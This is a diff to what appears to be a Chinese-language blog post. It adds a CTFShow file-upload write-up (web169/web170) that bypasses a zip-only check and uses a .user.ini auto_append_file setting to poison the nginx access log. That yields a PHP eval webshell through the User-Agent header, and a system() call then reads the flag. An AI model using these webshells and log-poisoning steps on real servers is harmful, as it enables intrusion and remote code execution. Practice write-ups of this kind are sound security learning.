@@ -257,6 +257,27 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168_1.png"></p>
+<h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><p>根据提示可以看到为高级免杀但我不知道到底过滤那些东西所以我看了其他师傅的wp,都说利用日志读取flag。且只前端检查为只能上传 zip 文件。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_5.png"></p>
+<p>准备两个文件分别是:</p>
+<p>.user.ini.zip(抓包删除 zip再上传):</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_append_file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>1.php.zip(抓包删除 zip再上传) 内容随意。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>先上传 .user.ini</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169.png"></p>
+<p>修改如下:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_1.png"></p>
+<p>再上传 1.php 并修改:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_2.png"></p>
+<p>然后将 一句话写入到 User-Agent: <?php eval($_POST[1]);?></p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_3.png"></p>
+<p>然后访问 upload/1.php 并传参: 1=system(‘tac ../flagaa.php’);</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_4.png"></p>
+<p>如图所示得到了 flag。</p>
+<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>同 web169</p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
